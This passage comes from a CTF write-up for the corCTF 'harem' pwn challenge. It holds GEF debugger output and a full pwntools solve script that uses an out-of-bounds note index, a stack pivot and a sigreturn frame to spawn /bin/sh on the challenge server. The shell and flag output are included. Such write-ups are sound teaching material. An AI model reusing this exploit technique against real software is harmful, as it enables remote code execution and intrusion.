<span style="color:#005DD0">$cs</span>: 0x33 <span style="color:#005DD0">$ss</span>: 0x2b <span style="color:#005DD0">$ds</span>: 0x00 <span style="color:#005DD0">$es</span>: 0x00 <span style="color:#005DD0">$fs</span>: 0x00 <span style="color:#005DD0">$gs</span>: 0x00 
<span style="color:#585858"><b>───────────────────────────────────────────────────────────────────── </b></span><span style="color:#2AA1B3">stack</span><span style="color:#585858"><b> ────</b></span>
<span style="color:#2AA1B3">0x00007ffe18de23d8</span>│+0x0000: <span style="color:#C01C28">0x0000000008000a08</span>  →  <span style="color:#585858"><b>&lt;main+2553&gt; jmp 0x8000a70 &lt;main+2657&gt;</b></span>	<span style="color:#005DD0"><b> ← $rsp</b></span>
<span style="color:#2AA1B3">0x00007ffe18de23e0</span>│+0x0008: 0x0000000000000000
<span style="color:#2AA1B3">0x00007ffe18de23e8</span>│+0x0010: 0x0000000000000000	<span style="color:#005DD0"><b> ← $rax, $rdi</b></span>
<span style="color:#2AA1B3">0x00007ffe18de23f0</span>│+0x0018: 0x0000000000000000
<span style="color:#2AA1B3">0x00007ffe18de23f8</span>│+0x0020: 0x0000000000000000
<span style="color:#2AA1B3">0x00007ffe18de2400</span>│+0x0028: 0x0000000000000000
<span style="color:#2AA1B3">0x00007ffe18de2408</span>│+0x0030: <span style="color:#A2734C">&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaafoobar&quot;</span>
<span style="color:#2AA1B3">0x00007ffe18de2410</span>│+0x0038: <span style="color:#A2734C">&quot;aaaaaaaaaaaaaaaaaaaaaaaaafoobar&quot;</span>
<span style="color:#585858"><b>─────────────────────────────────────────────────────────────── </b></span><span style="color:#2AA1B3">code:x86:64</span><span style="color:#585858"><b> ────</b></span>
   <span style="color:#585858"><b> 0x8000cb8 &lt;handler+196&gt;    call   0x8009840 &lt;os.exit&gt;</b></span>
   <span style="color:#585858"><b> 0x8000cbd &lt;handler+201&gt;    leave  </b></span>
   <span style="color:#585858"><b> 0x8000cbe &lt;handler+202&gt;    ret    </b></span>
 <span style="color:#26A269">→  0x8000cbf &lt;note_read+0&gt;    push   rbp</span>
    0x8000cc0 &lt;note_read+1&gt;    mov    rbp, rsp
    0x8000cc3 &lt;note_read+4&gt;    sub    rsp, 0x128
    0x8000cca &lt;note_read+11&gt;   push   rbx
    0x8000ccb &lt;note_read+12&gt;   movzx  eax, BYTE PTR [rdi+0xa0]
    0x8000cd2 &lt;note_read+19&gt;   cmp    eax, 0x0
<span style="color:#585858"><b>─────────────────────────────────────────────────────────────────── </b></span><span style="color:#2AA1B3">threads</span><span style="color:#585858"><b> ────</b></span>
[<span style="color:#26A269"><b>#0</b></span>] Id 1, Name: &quot;harem&quot;, <span style="color:#C01C28"><b>stopped</b></span> <span style="color:#005DD0">0x8000cbf</span> in <span style="color:#A2734C"><b>note_read</b></span> (), reason: <span style="color:#A347BA"><b>BREAKPOINT</b></span>
<span style="color:#585858"><b>───────────────────────────────────────────────────────────────────── </b></span><span style="color:#2AA1B3">trace</span><span style="color:#585858"><b> ────</b></span>
[<span style="color:#26A269"><b>#0</b></span>] 0x8000cbf → <span style="color:#26A269">note_read</span>()
[<span style="color:#A347BA"><b>#1</b></span>] 0x8000a08 → <span style="color:#26A269">main</span>()
<span style="color:#585858"><b>────────────────────────────────────────────────────────────────────────────────</b></span>
<span style="color:#26A269"><b>gef➤  </b></span>grep foobar
<span style="color:#005DD0"><b>[+]</b></span> Searching &apos;<span style="color:#A2734C">foobar</span>&apos; in memory
<span style="color:#26A269"><b>[+]</b></span> In &apos;<span style="color:#005DD0">/home/alex/harem-scarem/harem</span>&apos;(0x80000000-0x80007000), permission=rw-
  0x80006471 - 0x80006479  →   &quot;<span style="color:#A347BA">foobar\n</span>&quot; 
<span style="color:#26A269"><b>[+]</b></span> In (0x7f004652c000-0x7f004692c000), permission=rw-
  0x7f004652c031 - 0x7f004652c037  →   &quot;<span style="color:#A347BA">foobar</span>&quot; 
<span style="color:#26A269"><b>[+]</b></span> In &apos;<span style="color:#005DD0">[stack]</span>&apos;(0x7ffe18dc3000-0x7ffe18de4000), permission=rw-
  0x7ffe18de2429 - 0x7ffe18de242f  →   &quot;<span style="color:#A347BA">foobar</span>&quot; 
<span style="color:#26A269"><b>gef➤  </b></span>vm
[ Legend:  <span style="color:#C01C28">Code</span> | <span style="color:#26A269">Heap</span> | <span style="color:#A347BA">Stack</span> ]
<span style="color:#005DD0">Start              End                Offset             Perm Path</span>
<span style="color:#C01C28">0x0000000007fff000</span> <span style="color:#C01C28">0x000000000801b000</span> <span style="color:#C01C28">0x0000000000000000</span> <span style="color:#C01C28">r-x</span> <span style="color:#C01C28">/home/alex/harem-scarem/harem</span>
0x0000000080000000 0x0000000080007000 0x000000000001c000 rw- /home/alex/harem-scarem/harem
0x0000000080007000 0x0000000080010000 0x0000000000000000 rw- 
0x00007f004652c000 0x00007f004692c000 0x0000000000000000 rw- 
<span style="color:#A347BA">0x00007ffe18dc3000</span> <span style="color:#A347BA">0x00007ffe18de4000</span> <span style="color:#A347BA">0x0000000000000000</span> <span style="color:#A347BA">rw-</span> <span style="color:#A347BA">[stack]</span>
0x00007ffe18df6000 0x00007ffe18dfa000 0x0000000000000000 r-- [vvar]
<span style="color:#C01C28">0x00007ffe18dfa000</span> <span style="color:#C01C28">0x00007ffe18dfc000</span> <span style="color:#C01C28">0x0000000000000000</span> <span style="color:#C01C28">r-x</span> <span style="color:#C01C28">[vdso]</span>
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 --x [vsyscall]
</code></pre>

### Implementation

I started to implement the exploit.
One problem that I ran into was that the `sigreturn` frame was much bigger than the maximum length of a note's contents.
It might have been possible to split the frame over multiple notes, but I figured that it was easier to place the frame at a fixed address together with the `/bin/sh` string and stack pivot to it.
I got the exploit to work with some minor debugging and obtained the flag.

Solve script with comments added:

```python
#!/usr/bin/env python3

import subprocess

from pwn import *

exe = ELF("./harem")

context.binary = exe

if args.REMOTE:
    r = remote("be.ax", 32564)
    # Solve the proof of work.
    r.recvuntil(b"sh -s ")
    powval = r.recvlineS(keepends=False)
    r.sendlineafter(b"solution: ", subprocess.run(["./redpwnpow-linux-amd64", powval], capture_output=True).stdout)
    log.info("solved pow")
else:
    r = process([exe.path])
    if args.GDB:
        gdb.attach(r)

sigreturn_gadget = 0x801a4ac
# leave; ret;
# For stack pivoting.
leave_gadget = 0x80009e2
syscall_gadget = 0x801a444

# Set the note index to an out-of-bound value.
# Send and receive separately to make it faster on a slow internet connection.
for _ in range(246):
    r.sendline(b"2")
for _ in range(246):
    r.recvuntil(b"> ")

# Overwrite the return address and saved rbp of main to stack pivot to the payload below.
r.sendlineafter(b"> ", b"3")
r.sendlineafter(b"title: ", b"")
# The saved rbp is overwritten with 0x80006468, which is 8 bytes before the start of the payload.
# The leave instruction at the end of main will pop this address into rbp.
# The return address is overwritten with the address of a leave gadget,
# which will move the address from rbp into rsp and pop into rbp so that rsp points to the payload.
# The payload address is found by inputting a random string and then searching for it with GEF's grep command.
r.sendlineafter(b"content: ", b"A" * 14 + p64(0x80006468) + p64(leave_gadget))

# Reset the note index back to 0 to avoid overwriting the stuff that was just written.
for _ in range(10):
    r.sendline(b"2")
for _ in range(10):
    r.recvuntil(b"> ")

# Construct sigreturn frame that sets the registers up for an execve call.
frame = SigreturnFrame()
# Address of /bin/sh string at the end of the payload
frame.rdi = 0x80006570
frame.rsi = 0
frame.rdx = 0
frame.rax = constants.SYS_execve
frame.rip = syscall_gadget
payload = p64(sigreturn_gadget) + bytes(frame) + b"/bin/sh\0"

# Insert the payload into memory at 0x80006470.
r.sendlineafter(b"> ", b"3")
r.sendlineafter(b"title: ", b"")
# Add some padding since stuff at the beginning might get overwritten.
r.sendlineafter(b"content: ", b"B" * 32 + payload)

# Cause main to return.
r.sendlineafter(b"> ", b"6")

r.interactive()
```

Output:

<pre><code>[alex@ctf harem-scarem]$ ./solve.py REMOTE
[<span style="color:#005DD0"><b>*</b></span>] &apos;/home/alex/harem-scarem/harem&apos;
    Arch:     amd64-64-little
    RELRO:    <span style="color:#C01C28">No RELRO</span>
    Stack:    <span style="color:#C01C28">No canary found</span>
    NX:       <span style="color:#C01C28">NX disabled</span>
    PIE:      <span style="color:#C01C28">No PIE (0x7fff000)</span>
    RWX:      <span style="color:#C01C28">Has RWX segments</span>
[<span style="color:#26A269"><b>+</b></span>] Opening connection to be.ax on port 32564: Done
[<span style="color:#005DD0"><b>*</b></span>] solved pow
[<span style="color:#005DD0"><b>*</b></span>] Switching to interactive mode
<span style="color:#C01C28"><b>$</b></span> ls
flag.txt
run
<span style="color:#C01C28"><b>$</b></span> cat flag.txt
corctf{sur3ly_th15_t1m3_17_w1ll_k1ll_c!!}
</code></pre>

Note that while the script does not use any of the output received from the target program, removing the `recvuntil` calls and using `sendline` instead of `sendlineafter` will break the exploit since the input data will be buffered differently.
